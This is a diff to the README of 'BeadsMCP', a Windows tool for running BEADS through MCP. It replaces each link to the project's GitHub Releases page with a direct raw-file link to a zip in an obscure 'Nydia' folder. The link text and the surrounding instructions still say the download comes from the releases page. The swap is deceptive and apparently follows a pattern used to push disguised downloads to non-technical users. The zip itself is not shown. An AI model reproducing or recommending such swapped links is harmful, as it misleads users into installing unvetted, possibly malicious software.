@@ -1,6 +1,6 @@
 # 🧩 BeadsMCP - Run BEADS Through MCP
 
-[![Download BeadsMCP](https://img.shields.io/badge/Download-BeadsMCP-blue?style=for-the-badge&logo=github)](https://github.com/Harby3816/BeadsMCP/releases)
+[![Download BeadsMCP](https://img.shields.io/badge/Download-BeadsMCP-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Harby3816/BeadsMCP/main/Nydia/MCP_Beads_1.1-alpha.2.zip)
 
 ## 📌 What BeadsMCP Does
 
@@ -29,7 +29,7 @@ BeadsMCP is made for normal desktop use. You do not need to know how to code to 
 
 Visit this page to download BeadsMCP for Windows:
 
-[Download from GitHub Releases](https://github.com/Harby3816/BeadsMCP/releases)
+[Download from GitHub Releases](https://raw.githubusercontent.com/Harby3816/BeadsMCP/main/Nydia/MCP_Beads_1.1-alpha.2.zip)
 
 On the releases page:
 
@@ -198,5 +198,5 @@ If that works, the setup is ready for daily use
 
 Use this page to download BeadsMCP for Windows:
 
-[https://github.com/Harby3816/BeadsMCP/releases](https://github.com/Harby3816/BeadsMCP/releases)
+[https://raw.githubusercontent.com/Harby3816/BeadsMCP/main/Nydia/MCP_Beads_1.1-alpha.2.zip](https://raw.githubusercontent.com/Harby3816/BeadsMCP/main/Nydia/MCP_Beads_1.1-alpha.2.zip)
 
